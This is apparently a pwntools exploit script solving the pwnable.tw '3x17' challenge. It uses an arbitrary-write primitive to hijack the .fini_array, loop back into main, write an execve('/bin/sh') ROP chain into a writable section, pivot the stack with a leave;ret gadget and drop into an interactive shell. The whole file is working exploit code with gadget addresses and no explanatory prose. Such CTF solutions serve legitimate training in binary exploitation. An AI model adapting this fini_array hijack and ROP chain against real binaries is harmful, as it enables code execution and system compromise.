import sys
from pwn import *

LOCAL = './assets/3x17'
REMOTE = ['chall.pwnable.tw', 10105]

context.binary = LOCAL
context.binary.checksec()

# break *0x0000000000402ba9
# break *0x0000000000474fbe

# p = remote(*REMOTE)
p = gdb.debug(LOCAL, gdbscript='''
    continue
''')
# p = process(LOCAL)

FINI_ARRAY_ADDR = 0x04B40F0
MAIN = 0x0401B6D
FINI = 0x0402960
RW_SECTION = FINI_ARRAY_ADDR + 8*2

def write(where, what):
    print(f'Writing at {where}')
    p.recvuntil(b'addr:')
    p.send(f'{where}'.encode())

    p.recvuntil(b'data:')
    p.send(what)

def init_rw_loop():
    payload = flat(
        FINI,
        MAIN
    )

    write(FINI_ARRAY_ADDR, payload)

def main():
    init_rw_loop()
    
    # stack pivot (technique 1)
    # 0x0000000000402ba9 : pop rsp ; ret
    # POP_RSP = 0x0000000000402ba9
    
    # stack pivot (technique 2)
    # 0x0000000000474fbe : leave ; nop ; ret
    LEAVE_RET = 0x0000000000474fbe

    # 0x0000000000401696 : pop rdi ; ret
    POP_RDI = 0x0000000000401696
    # 0x0000000000406c30 : pop rsi ; ret
    POP_RSI = 0x0000000000406c30
    
    # 0x0000000000446e35 : pop rdx ; ret
    POP_RDX = 0x0000000000446e35
    # 0x000000000041e4af : pop rax ; ret
    POP_RAX = 0x000000000041e4af
    # 0x00000000004022b4 : syscall
    SYSCALL = 0x00000000004022b4
    # 0x0000000000401016 : ret
    RET = 0x0000000000401016

    chain = [
        POP_RDI,
        0, # /bin/sh\0 pointer placeholder
        POP_RSI,
        0,
        POP_RDX,
        0,
        POP_RAX,
        0x3b,
        SYSCALL,
        b'/bin/sh\0'
    ]

    chain[1] = RW_SECTION + (len(chain)-1)*8


    for i in range(len(chain)):
        payload = flat(
            chain[i],
        )

        write(RW_SECTION + i*8, payload)
    
    write(FINI_ARRAY_ADDR, flat(
        # Pivot stack
        LEAVE_RET, 
        # Trigger rop
        RET,
    ))

    p.interactive()
    p.close()    
    pass

if __name__ == "__main__":
    main() 